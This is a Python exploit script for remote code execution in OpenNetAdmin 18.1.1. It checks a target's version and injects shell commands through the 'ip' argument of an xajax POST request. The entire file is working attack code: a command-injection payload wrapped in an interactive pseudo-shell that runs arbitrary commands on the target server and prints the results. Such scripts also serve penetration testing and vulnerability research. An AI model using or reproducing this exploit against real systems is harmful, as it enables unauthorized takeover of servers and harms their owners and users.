#!/usr/bin/python3

'''
# Exploit title: OpenNetAdmin (ona) 18.1.1 - Remote Code Execution
# Author: Z3R0 (0x30)
# Vendor homepage: http://opennetadmin.com/
# Version: v18.1.1
# Tested on: Linux
'''

# Importing necessary stuff
import sys, requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning - SSL warning suppressed
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Guide function - how to run the exploit?
def guide(script):
    print("\n[-] Usage: python3 " + script + " [check | exploit] <URI>")
    print("\n[*] Options:")
    print("\t[+] check      : Verify if the target is vulnerable or not.")
    print("\t[+] exploit    : Exploit the target\n")
    exit(1)

# Check function - Is target vulnerable?
def check(target):
    try:
        req = requests.get(url=target,verify=False)     # make a get request without SSL verify
    except:
        print("[-] Warning: Error, cannot connect to the target...")
        exit(1)
    return('v18.1.1' in req.text)

# Exploit function - exploit the site
def exploit(target, command):
    payload = {
        'xajax':'window_submit',
        'xajaxr':'1574117726710',
        'xajaxargs[]':['tooltips','ip=>;echo \"BEGIN\";{} 2>&1;echo \"END\"'.format(command),'ping']
    }
    try:
        req = requests.post(url=target,data=payload,verify=False)
    except:
        print("[-] Warning: Error, cannot send payload to the target.")
        exit(1)
    data = req.text
    result = data[data.find('BEGIN')+6:data.find('END')-1]
    return(result)

if __name__ == "__main__":
    print("[*] OpenNetAdmin 18.1.1 - Remote code execution, by Z3R0")
    script = sys.argv[0]
    if len(sys.argv) != 3:
        guide(script)
    else:
        print("[+] Connecting...")
        option = sys.argv[1].lower()
        target = sys.argv[2].lower()
        if option == 'check':
            if (check(target)):
                print("[+] Target is vulnerable!")
            else:
                print("[-] Target is NOT VULNERABLE!")
        elif option == 'exploit':
            if (check(target)):
                print("[+] Connection established!")
            else:
                print("[-] Cannot exploit the target!")
            current_dir = ""

            while(True):
                command = str(input('[Z3R0]~$ ')).lower()
                if (command == 'exit') or (command == 'quit'):
                    exit(0)

                # Handle 'cd' commands internally
                if command.startswith('cd '):
                    path = command[3:].strip()
                    if path == "..":
                        current_dir = "/".join(current_dir.rstrip('/').split('/')[:-1])
                    elif path.startswith('/'):
                        current_dir = path
                    else:
                        current_dir = current_dir + '/' + path if current_dir else path
                    continue

                # Prepend 'cd <current_dir> &&' if a current_dir exists
                full_command = f"cd {current_dir} && {command}" if current_dir else command
                output = exploit(target, full_command)
                print(output)
                #print(exploit(target, command))
        else:
            print("[-] Option not found")
